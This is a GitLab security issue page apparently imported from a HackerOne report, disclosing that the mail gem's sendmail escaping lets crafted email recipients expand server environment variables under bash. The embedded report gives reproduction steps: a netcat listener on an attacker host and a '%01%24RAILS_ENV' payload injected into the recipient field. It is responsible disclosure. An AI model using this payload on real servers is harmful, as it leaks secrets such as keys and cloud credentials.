data-sourcepos="69:1-69:26" dir="auto">See the steps to reproduce</p>&#x000A;<h5 data-sourcepos="71:1-71:44" dir="auto">&#x000A;<a id="user-content-what-is-the-current-bug-behavior" class="anchor" href="#what-is-the-current-bug-behavior" aria-hidden="true"></a>What is the current <em data-sourcepos="71:28-71:32">bug</em> behavior?</h5>&#x000A;<ul data-sourcepos="72:1-75:0" dir="auto">&#x000A;<li data-sourcepos="72:1-72:36">No validation on email addresses</li>&#x000A;<li data-sourcepos="73:1-73:73">The mail gem passes a string to <code data-sourcepos="73:36-73:43">IO.popen</code> causing a shell to be used</li>&#x000A;<li data-sourcepos="74:1-75:0">Insufficient escaping of the email addresses by the mail gem</li>&#x000A;</ul>&#x000A;<h5 data-sourcepos="76:1-76:49" dir="auto">&#x000A;<a id="user-content-what-is-the-expected-correct-behavior" class="anchor" href="#what-is-the-expected-correct-behavior" aria-hidden="true"></a>What is the expected <em data-sourcepos="76:29-76:37">correct</em> behavior?</h5>&#x000A;<p data-sourcepos="77:1-77:242" dir="auto">The master branch of mail seems to have fixed the issue by passing an array to <code data-sourcepos="77:81-77:88">IO.popen</code> to avoid a shell, but there doesn't seem to be a new release <a href="https://github.com/mikel/mail/blob/master/lib/mail/network/delivery_methods/sendmail.rb#L63" rel="nofollow noreferrer noopener" target="_blank">https://github.com/mikel/mail/blob/master/lib/mail/network/delivery_methods/sendmail.rb#L63</a></p>&#x000A;<p data-sourcepos="79:1-79:109" dir="auto">The email addresses could also be validated before being used to ensure that they have no invalid characters.</p>&#x000A;<h5 data-sourcepos="81:1-81:39" dir="auto">&#x000A;<a id="user-content-relevant-logs-andor-screenshots" class="anchor" href="#relevant-logs-andor-screenshots" aria-hidden="true"></a>Relevant logs and/or screenshots</h5>&#x000A;<h5 data-sourcepos="83:1-83:25" dir="auto">&#x000A;<a id="user-content-output-of-checks" class="anchor" href="#output-of-checks" aria-hidden="true"></a>Output of checks</h5>&#x000A;<h6 data-sourcepos="84:1-84:44" dir="auto">&#x000A;<a id="user-content-results-of-gitlab-environment-info" class="anchor" href="#results-of-gitlab-environment-info" aria-hidden="true"></a>Results of GitLab environment info</h6>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="85:1-121:3" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">System information  </span>&#x000A;<span id="LC2" class="line" lang="plaintext">System:  </span>&#x000A;<span id="LC3" class="line" lang="plaintext">Proxy:		no  </span>&#x000A;<span id="LC4" class="line" lang="plaintext">Current User:	git  </span>&#x000A;<span id="LC5" class="line" lang="plaintext">Using RVM:	no  </span>&#x000A;<span id="LC6" class="line" lang="plaintext">Ruby Version:	2.7.2p137  </span>&#x000A;<span id="LC7" class="line" lang="plaintext">Gem Version:	3.1.4  </span>&#x000A;<span id="LC8" class="line" lang="plaintext">Bundler Version:2.1.4  </span>&#x000A;<span id="LC9" class="line" lang="plaintext">Rake Version:	13.0.3  </span>&#x000A;<span id="LC10" class="line" lang="plaintext">Redis Version:	6.0.14  </span>&#x000A;<span id="LC11" class="line" lang="plaintext">Git Version:	2.32.0  </span>&#x000A;<span id="LC12" class="line" lang="plaintext">Sidekiq Version:5.2.9  </span>&#x000A;<span id="LC13" class="line" lang="plaintext">Go Version:	unknown</span>&#x000A;<span id="LC14" class="line" lang="plaintext"></span>&#x000A;<span id="LC15" class="line" lang="plaintext">GitLab information  </span>&#x000A;<span id="LC16" class="line" lang="plaintext">Version:	14.1.1-ee  </span>&#x000A;<span id="LC17" class="line" lang="plaintext">Revision:	f331f932688  </span>&#x000A;<span id="LC18" class="line" lang="plaintext">Directory:	/opt/gitlab/embedded/service/gitlab-rails  </span>&#x000A;<span id="LC19" class="line" lang="plaintext">DB Adapter:	PostgreSQL  </span>&#x000A;<span id="LC20" class="line" lang="plaintext">DB Version:	12.6  </span>&#x000A;<span id="LC21" class="line" lang="plaintext">URL:		http://gitlab.testing  </span>&#x000A;<span id="LC22" class="line" lang="plaintext">HTTP Clone URL:	http://gitlab.testing/some-group/some-project.git  </span>&#x000A;<span id="LC23" class="line" lang="plaintext">SSH Clone URL:	git@gitlab.testing:some-group/some-project.git  </span>&#x000A;<span id="LC24" class="line" lang="plaintext">Elasticsearch:	no  </span>&#x000A;<span id="LC25" class="line" lang="plaintext">Geo:		no  </span>&#x000A;<span id="LC26" class="line" lang="plaintext">Using LDAP:	no  </span>&#x000A;<span id="LC27" class="line" lang="plaintext">Using Omniauth:	yes  </span>&#x000A;<span id="LC28" class="line" lang="plaintext">Omniauth Providers:</span>&#x000A;<span id="LC29" class="line" lang="plaintext"></span>&#x000A;<span id="LC30" class="line" lang="plaintext">GitLab Shell  </span>&#x000A;<span id="LC31" class="line" lang="plaintext">Version:	13.19.0  </span>&#x000A;<span id="LC32" class="line" lang="plaintext">Repository storage paths:  </span>&#x000A;<span id="LC33" class="line" lang="plaintext">- default: 	/var/opt/gitlab/git-data/repositories  </span>&#x000A;<span id="LC34" class="line" lang="plaintext">GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell  </span>&#x000A;<span id="LC35" class="line" lang="plaintext">Git:		/opt/gitlab/embedded/bin/git  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<h4 data-sourcepos="123:1-123:12" dir="auto">&#x000A;<a id="user-content-impact-1" class="anchor" href="#impact-1" aria-hidden="true"></a>Impact</h4>&#x000A;<p data-sourcepos="125:1-125:282" dir="auto">An attacker can read arbitrary environment variables from the server if bash is configured as the default shell. As sensitive values are often passed around using environment variables (such as <code data-sourcepos="125:196-125:210">SECRET_KEY_BASE</code> or aws credentials) they could be read and used to gain further access</p>&#x000A;<h2 data-sourcepos="127:1-127:19" dir="auto">&#x000A;<a id="user-content-how-to-reproduce" class="anchor" href="#how-to-reproduce" aria-hidden="true"></a>How To Reproduce</h2>&#x000A;<p data-sourcepos="129:1-129:57" dir="auto">Please add <a data-sourcepos="129:12-129:40" href="https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues" rel="nofollow noreferrer noopener" target="_blank">reproducibility information</a> to this section:</p>&#x000A;<ol data-sourcepos="131:1-134:0" dir="auto">&#x000A;<li data-sourcepos="131:1-131:2">&#x000A;</li>&#x000A;<li data-sourcepos="132:1-132:2">&#x000A;</li>&#x000A;<li data-sourcepos="133:1-133:2">&#x000A;</li>&#x000A;</ol></div>
</div>

</div>
<div class="js-issue-widgets">
<div class="emoji-block emoji-block-sticky">
<div class="row gl-m-0 gl-justify-between">
<div class="js-noteable-awards">
<div class="gl-flex gl-flex-wrap gl-justify-between gl-pt-3">
<div data-can-award-emoji="false" data-path="/api/v4/projects/278964/issues/337601/award_emoji" data-show-default-award-emojis="true" id="js-vue-awards-block"></div>

</div>

</div>
<div class="new-branch-col gl-font-size-0 gl-my-2">

</div>
</div>
</div>

</div>
</div>
<div class="js-issue-widgets">

<div class="js-design-management" data-issue-iid="337601" data-issue-path="/gitlab-org/gitlab/-/issues/337601" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-project-path="gitlab-org/gitlab" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div class="js-work-item-links-root" data-full-path="gitlab-org/gitlab" data-issuable-id="91412505" data-issuable-iid="337601" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-can-bulk-edit-epics="false" data-wi-can-create-projects="false" data-wi-default-branch="master" data-wi-epics-list-path="/groups/gitlab/-/epics" data-wi-full-path="gitlab-org/gitlab" data-wi-group-id="9970" data-wi-group-issues-path="/groups/gitlab/-/issues" data-wi-group-path="gitlab-org" data-wi-has-epics-feature="true" data-wi-has-issuable-health-status-feature="true" data-wi-has-issue-weights-feature="true" data-wi-has-iterations-feature="true" data-wi-has-linked-items-epics-feature="true" data-wi-has-okrs-feature="true" data-wi-has-quality-management-feature="true" data-wi-has-scoped-labels-feature="true" data-wi-has-subepics-feature="true" data-wi-is-signed-in="false" data-wi-issues-list-path="/gitlab-org/gitlab/-/issues" data-wi-labels-fetch-path="/groups/gitlab/-/labels.json?include_ancestor_groups=true&amp;only_group_labels=true" data-wi-labels-manage-path="/gitlab-org/gitlab/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-new-project-path="/projects/new?namespace_id=9970" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>


<div class="js-related-issues-root" data-can-add-related-issues="false" data-endpoint="/gitlab-org/gitlab/-/issues/337601/links" data-full-path="gitlab-org/gitlab" data-has-issue-weights-feature="true" data-has-iterations-feature="true" data-help-path="/help/user/project/issues/related_issues.md" data-is-group="false" data-issuable-type="issue" data-show-categorized-issues="true" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-can-bulk-edit-epics="false" data-wi-can-create-projects="false" data-wi-default-branch="master" data-wi-epics-list-path="/groups/gitlab/-/epics" data-wi-full-path="gitlab-org/gitlab" data-wi-group-id="9970" data-wi-group-issues-path="/groups/gitlab/-/issues" data-wi-group-path="gitlab-org" data-wi-has-epics-feature="true" data-wi-has-issuable-health-status-feature="true" data-wi-has-issue-weights-feature="true" data-wi-has-iterations-feature="true" data-wi-has-linked-items-epics-feature="true" data-wi-has-okrs-feature="true" data-wi-has-quality-management-feature="true" data-wi-has-scoped-labels-feature="true" data-wi-has-subepics-feature="true" data-wi-is-signed-in="false" data-wi-issues-list-path="/gitlab-org/gitlab/-/issues" data-wi-labels-fetch-path="/groups/gitlab/-/labels.json?include_ancestor_groups=true&amp;only_group_labels=true" data-wi-labels-manage-path="/gitlab-org/gitlab/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-new-project-path="/projects/new?namespace_id=9970" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div data-has-closing-merge-request="false" data-iid="337601" data-project-path="gitlab-org/gitlab" id="js-related-merge-requests"></div>
<div data-url="/gitlab-org/gitlab/-/issues/337601/related_branches" id="related-branches">
</div>
</div>
<div class="js-issue-widgets">
<section class="issuable-discussion js-vue-notes-event">
<div data-can-add-timeline-events="false" data-current-user-data="null" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-noteable-data="{&quot;id&quot;:91412505,&quot;iid&quot;:337601,&quot;description&quot;:&quot;**[HackerOne report #1286317](https://hackerone.com/reports/1286317)** by `vakzz` on 2021-08-02, assigned to @rshambhuni:\n\n[Report](#report) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n#####  Summary\n\nThe gitlab omnibus edition defaults to using `:sendmail` as the delivery method for emails. ActionMailer depends on mail v2.7.1 for this https://gitlab.com/gitlab-org/gitlab/-/blob/v14.1.1-ee/Gemfile.lock#L1546\n\nWhen `:sendmail` is used as the delivery method, `/usr/sbin/sendmail` will end up being called with the `to` address going through the following function:\n\nhttps://github.com/mikel/mail/blob/2.7.1/lib/mail/network/delivery_methods/sendmail.rb#L85-L93  \n```ruby  \n    def self.shellquote(address)  \n      # Process as a single byte sequence because not all shell  \n      # implementations are multibyte aware.  \n      #  \n      # A LF cannot be escaped with a backslash because a backslash + LF  \n      # combo is regarded as line continuation and simply ignored. Strip it.  \n      escaped = address.gsub(/([^A-Za-z0-9_\\s\\+\\-.,:\\/@~])/n, \&quot;\\\\\\\\\\\\1\&quot;).gsub(\&quot;\\n\&quot;, &#39;&#39;)  \n      %(\&quot;#{escaped}\&quot;)  \n    end  \n```\n\nThere is a long standing issue in bash where a backlash followed by a `\\001` character can cause issues with interpolation   \n https://lists.gnu.org/archive/html/bug-bash/2007-03/msg00065.html which causes `\\^A\\$` to think second backslash is being escaped and leaves the `$` unescaped (`^A` is `\\x00` and can be entered with ctrl-v ctrl-a):\n\n```bash  \nbash-5.1$ echo -n \&quot;\\^A\\$USER\&quot; | xxd  \n00000000: 5c01 5c77 696c 6c                        \\.\\will  \n```\n\nSo if an email is sent to `\&quot;someone+\\x01$HOME@place.com\&quot;` then after shellqoute it will be `\&quot;someone+\\\\u0001\\$HOME@place.com\&quot;` and bash will expand the `HOME ` variable.\n\nSince `sendmail` is run using a string to `IO.popen`, this bug relies on bash being the default /bin/sh shell (which it is on OSX, RHEL, Centos and can be done in Ubuntu with `dpkg-reconfigure dash`) .\n\n\n#####  Steps to reproduce  \n1. Use something like vagrant/virtualbox to create a CentOS 8 vm or spin up a vps  \n1. Following the instructions to install gitlab  https://about.gitlab.com/install/#centos-8.  \n1. (ALT) Alternatively to steps 1 and 2 the docker installation can be used if you run `dpkg-reconfigure dash` and disable dash as the default system shell  \n1. Somewhere with a publicly accessible ip run `echo -e &#39;200 ok\\n200 ok\\n200 ok\\n200 ok\\n200 ok\\n200 ok\\n&#39; | sudo nc -vl 25`  \n1. Login to gitlab and create a new project  \n1. Go to Settings -\u003e Integrations -\u003e Emails on push  \n1. Fire up Burp or open the network tab in Chrome  \n1. In the `Recipients` enter `user+test@111.111.111.111.getmoss.site` replacing `111.111.111.111` with the ip of the machine running `nc`  \n1. Ensure `Trigger event for pushes to the repository.` is checked and press save  \n1. Either edit the request in burp or copy as curl from the network tab and change the `test` in the email to be `%01%24RAILS_ENV` and run the request  \n1. Edit or add a file to the project  \n1. You should see the environment variable in the `to` address in `nc`\n\n```  \n$ echo -e &#39;200 ok\\n200 ok\\n200 ok\\n200 ok\\n200 ok\\n200 ok\\n&#39; | sudo nc -vl 25  \nListening on [103.xxx.xxx.xxx] (family 0, port 25)  \nConnection from [45.xxx.xxx.xxx] port 25 [tcp/smtp] accepted (family 2, sport 53932)  \nEHLO localhost.localdomain  \nMAIL FROM:\u003cgitlab@gitlab.testing\u003e  \nRCPT TO:\u003c\&quot;will+production\&quot;[@]103.xxx.xxx.xxx.getmoss.site\u003e  \nDATA  \nRSET  \nQUIT  \n```\n\n#####  Impact  \nAn attacker can read arbitrary environment variables from the server if bash is configured as the default shell. As sensitive values are often passed around using environment variables (such as `SECRET_KEY_BASE` or aws credentials) they could be read and used to gain further access\n\n#####  Examples  \nSee the steps to reproduce\n\n#####  What is the current *bug* behavior?  \n* No validation on email addresses  \n* The mail gem passes a string to `IO.popen` causing a shell to be used  \n* Insufficient escaping of the email addresses by the mail gem\n\n#####  What is the expected *correct* behavior?  \nThe master branch of mail seems to have fixed the issue by passing an array to `IO.popen` to avoid a shell, but there doesn&#39;t seem to be a new release https://github.com/mikel/mail/blob/master/lib/mail/network/delivery_methods/sendmail.rb#L63\n\nThe email addresses could also be validated before being used to ensure that they have no invalid characters.\n\n#####  Relevant logs and/or screenshots\n\n#####  Output of checks  \n######  Results of GitLab environment info  \n```  \nSystem information  \nSystem:  \nProxy:\t\tno  \nCurrent User:\tgit  \nUsing RVM:\tno  \nRuby Version:\t2.7.2p137  \nGem Version:\t3.1.4  \nBundler Version:2.1.4  \nRake Version:\t13.0.3  \nRedis Version:\t6.0.14  \nGit Version:\t2.32.0  \nSidekiq Version:5.2.9  \nGo Version:\tunknown\n\nGitLab information  \nVersion:\t14.1.1-ee  \nRevision:\tf331f932688  \nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails  \nDB Adapter:\tPostgreSQL  \nDB Version:\t12.6  \nURL:\t\thttp://gitlab.testing  \nHTTP Clone URL:\thttp://gitlab.testing/some-group/some-project.git  \nSSH Clone URL:\tgit@gitlab.testing:some-group/some-project.git  \nElasticsearch:\tno  \nGeo:\t\tno  \nUsing LDAP:\tno  \nUsing Omniauth:\tyes  \nOmniauth Providers:\n\nGitLab Shell  \nVersion:\t13.19.0  \nRepository storage paths:  \n- default: \t/var/opt/gitlab/git-data/repositories  \nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell  \nGit:\t\t/opt/gitlab/embedded/bin/git  \n```\n\n####  Impact\n\nAn attacker can read arbitrary environment variables from the server if bash is configured as the default shell. As sensitive values are often passed around using environment variables (such as `SECRET_KEY_BASE` or aws credentials) they could be read and used to gain further access\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues&quot;,&quot;title&quot;:&quot;Environment variables can be leaked via the `:sendmail` delivery method&quot;,&quot;time_estimate&quot;:0,&quot;total_time_spent&quot;:0,&quot;human_time_estimate&quot;:null,&quot;human_total_time_spent&quot;:null,&quot;state&quot;:&quot;closed&quot;,&quot;milestone_id&quot;:2204140,&quot;updated_by_id&quot;:1786152,&quot;created_at&quot;:&quot;2021-08-04T06:03:56Z&quot;,&quot;updated_at&quot;:&quot;2023-04-26T00:48:47Z&quot;,&quot;milestone&quot;:{&quot;id&quot;:2204140,&quot;iid&quot;:71,&quot;group_id&quot;:9970,&quot;title&quot;:&quot;14.9&quot;,&quot;description&quot;:&quot;&quot;,&quot;state&quot;:&quot;closed&quot;,&quot;created_at&quot;:&quot;2021-08-26T19:11:46.841Z&quot;,&quot;updated_at&quot;:&quot;2023-07-18T12:52:39.975Z&quot;,&quot;due_date&quot;:&quot;2022-03-17&quot;,&quot;start_date&quot;:&quot;2022-02-18&quot;,&quot;expired&quot;:true,&quot;web_url&quot;:&quot;https://gitlab.com/groups/gitlab-org/-/milestones/71&quot;},&quot;labels&quot;:[{&quot;id&quot;:12240031,&quot;title&quot;:&quot;Category:Integrations&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Issues related to integrations with 3rd party services. &quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2019-09-26T12:31:52.318Z&quot;,&quot;updated_at&quot;:&quot;2019-09-26T12:31:52.318Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3417347,&quot;title&quot;:&quot;HackerOne&quot;,&quot;color&quot;:&quot;#0033CC&quot;,&quot;description&quot;:&quot;&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-01-31T13:53:42.609Z&quot;,&quot;updated_at&quot;:&quot;2019-01-09T12:13:21.325Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:17851401,&quot;title&quot;:&quot;Integration::EmailsOnPush&quot;,&quot;color&quot;:&quot;#69D100&quot;,&quot;description&quot;:&quot;Issues related to the Emails On Push integration&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2021-01-15T15:44:44.267Z&quot;,&quot;updated_at&quot;:&quot;2021-01-15T15:44:44.267Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:16865576,&quot;title&quot;:&quot;Weakness::CWE-200&quot;,&quot;color&quot;:&quot;#7F8C8D&quot;,&quot;description&quot;:&quot;Information Disclosure&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2020-10-28T22:27:42.311Z&quot;,&quot;updated_at&quot;:&quot;2020-10-28T22:27:42.311Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2677574,&quot;title&quot;:&quot;auto updated&quot;,&quot;color&quot;:&quot;#FFECDB&quot;,&quot;description&quot;:&quot;Issues that have been updated in accordance with our issue triage policies (https://gitlab.com/gitlab-org/gitlab-ce/blob/master/doc/development/contributing/issue_workflow.md)&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2017-09-19T02:09:18.221Z&quot;,&quot;updated_at&quot;:&quot;2019-05-02T11:05:59.557Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2492649,&quot;title&quot;:&quot;backend&quot;,&quot;color&quot;:&quot;#D10069&quot;,&quot;description&quot;:&quot;Issues that require backend work&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-08-15T14:49:42.004Z&quot;,&quot;updated_at&quot;:&quot;2018-06-11T10:34:33.030Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:4107753,&quot;title&quot;:&quot;bug::vulnerability&quot;,&quot;color&quot;:&quot;#CC0000&quot;,&quot;description&quot;:&quot;A security vulnerability&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-05-22T15:15:09.960Z&quot;,&quot;updated_at&quot;:&quot;2022-03-16T11:32:16.336Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:4116705,&quot;title&quot;:&quot;devops::foundations&quot;,&quot;color&quot;:&quot;#e44d2a&quot;,&quot;description&quot;:&quot;Issues for the Foundations stage of the DevOps lifecycle (e.g. Import \u0026 Integrate, Personal Productivity, etc)&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-05-23T15:35:30.635Z&quot;,&quot;updated_at&quot;:&quot;2024-08-13T17:20:38.144Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:30057931,&quot;title&quot;:&quot;group::import and integrate&quot;,&quot;color&quot;:&quot;#a8d695&quot;,&quot;description&quot;:&quot;Issues, MRs and Epics belong to group::import and integrate https://handbook.gitlab.com/handbook/engineering/development/dev/manage/import-and-integrate/\nresulted from merging group::integrations and group::import | PM: @m_frankiewicz&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2023-04-25T21:26:50.744Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T07:52:00.403Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3857529,&quot;title&quot;:&quot;priority::3&quot;,&quot;color&quot;:&quot;#fff600&quot;,&quot;description&quot;:&quot;We want to address this but may have other higher priority items. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#priority&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-04-13T08:02:52.659Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:23:53.318Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:14918378,&quot;title&quot;:&quot;section::dev&quot;,&quot;color&quot;:&quot;#F0AD4E&quot;,&quot;description&quot;:&quot;Issues related to the Dev section&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;updated_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2779335,&quot;title&quot;:&quot;security&quot;,&quot;color&quot;:&quot;#d9534f&quot;,&quot;description&quot;:&quot;Issues related to the security of GitLab or its dependencies. Please report vulnerabilities responsibly per https://about.gitlab.com/security/disclosure/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-10-05T14:36:39.341Z&quot;,&quot;updated_at&quot;:&quot;2023-05-24T20:20:05.269Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:21977643,&quot;title&quot;:&quot;security-backlog::review-complete&quot;,&quot;color&quot;:&quot;#d9534f&quot;,&quot;description&quot;:&quot;Signifies that this security-backlog issue has been reviewed by an Appsec team member&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2021-10-04T18:05:29.766Z&quot;,&quot;updated_at&quot;:&quot;2021-10-04T18:06:23.334Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3713901,&quot;title&quot;:&quot;severity::3&quot;,&quot;color&quot;:&quot;#fff600&quot;,&quot;description&quot;:&quot;Major - applies to bugs and bug categories of availability, performance, security and ux. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#severity&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-03-23T14:46:22.464Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:12:27.359Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2278648,&quot;title&quot;:&quot;type::bug&quot;,&quot;color&quot;:&quot;#cc0000&quot;,&quot;description&quot;:&quot;Issues that report undesirable or incorrect behavior. See https://handbook.gitlab.com/handbook/product/groups/product-analysis/engineering/metrics/#work-type-classification&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-07-07T20:20:34.868Z&quot;,&quot;updated_at&quot;:&quot;2024-11-08T09:52:16.699Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:22408318,&quot;title&quot;:&quot;workflow::awaiting security release&quot;,&quot;color&quot;:&quot;#6699cc&quot;,&quot;description&quot;:&quot;This is a security issue that is ready to be deployed but awaiting a security release&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2021-11-02T16:15:28.794Z&quot;,&quot;updated_at&quot;:&quot;2021-11-02T16:15:28.794Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false}],&quot;lock_version&quot;:1,&quot;author_id&quot;:2741139,&quot;confidential&quot;:false,&quot;discussion_locked&quot;:null,&quot;assignees&quot;:[{&quot;id&quot;:423116,&quot;username&quot;:&quot;toupeira&quot;,&quot;name&quot;:&quot;Markus Koller&quot;,&quot;state&quot;:&quot;active&quot;,&quot;locked&quot;:false,&quot;avatar_url&quot;:&quot;https://secure.gravatar.com/avatar/b8013135709613bf9b9c0bf009e0f59459e7c6568f5e8f6f769ea4eb9142da60?s=80\u0026d=identicon&quot;,&quot;web_url&quot;:&quot;https://gitlab.com/toupeira&quot;}],&quot;due_date&quot;:&quot;2021-11-02&quot;,&quot;project_id&quot;:278964,&quot;moved_to_id&quot;:null,&quot;duplicated_to_id&quot;:null,&quot;web_url&quot;:&quot;/gitlab-org/gitlab/-/issues/337601&quot;,&quot;current_user&quot;:{&quot;can_create_note&quot;:false,&quot;can_create_confidential_note&quot;:false,&quot;can_update&quot;:false,&quot;can_set_issue_metadata&quot;:false,&quot;can_award_emoji&quot;:false},&quot;create_note_path&quot;:&quot;/gitlab-org/gitlab/notes?target_id=91412505\u0026target_type=issue&quot;,&quot;preview_note_path&quot;:&quot;/gitlab-org/gitlab/-/preview_markdown?target_id=337601\u0026target_type=Issue&quot;,&quot;is_project_archived&quot;:false,&quot;issue_email_participants&quot;:[],&quot;type&quot;:&quot;ISSUE&quot;,&quot;weight&quot;:null,&quot;blocked&quot;:false,&quot;blocked_by_issues&quot;:[]}" data-noteable-type="Issue" data-notes-data="{&quot;noteableType&quot;:&quot;issue&quot;,&quot;noteableId&quot;:91412505,&quot;projectId&quot;:278964,&quot;groupId&quot;:null,&quot;discussionsPath&quot;:&quot;/gitlab-org/gitlab/-/issues/337601/discussions.json&quot;,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;newSessionPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;quickActionsDocsPath&quot;:&quot;/help/user/project/quick_actions.md&quot;,&quot;closePath&quot;:&quot;/gitlab-org/gitlab/-/issues/337601.json?issue%5Bstate_event%5D=close&quot;,&quot;reopenPath&quot;:&quot;/gitlab-org/gitlab/-/issues/337601.json?issue%5Bstate_event%5D=reopen&quot;,&quot;notesPath&quot;:&quot;/gitlab-org/gitlab/noteable/issue/91412505/notes&quot;,&quot;prerenderedNotesCount&quot;:10,&quot;lastFetchedAt&quot;:1736340213000000,&quot;notesFilter&quot;:null}" data-notes-filters="{&quot;Show all activity&quot;:0,&quot;Show comments only&quot;:1,&quot;Show history only&quot;:2}" data-report-abuse-path="/-/abuse_reports/add_category" data-show-timeline-view-toggle="false" data-target-type="issue" id="js-vue-notes"></div>
</section>

</div>
</div>
<aside aria-label="issue" aria-live="polite" class="right-sidebar js-right-sidebar js-issuable-sidebar right-sidebar-expanded" data-always-show-toggle data-auto-collapse data-issuable-type="issue">
<div class="issuable-sidebar">
<div class="issuable-sidebar-header">
<button class="gl-button btn btn-md btn-default gutter-toggle gl-float-right js-sidebar-toggle has-tooltip !gl-border-0" type="button" aria-label="Toggle sidebar" title="Collapse sidebar" data-container="body" data-placement="left" data-boundary="viewport" type="button"><span class="gl-button-text">
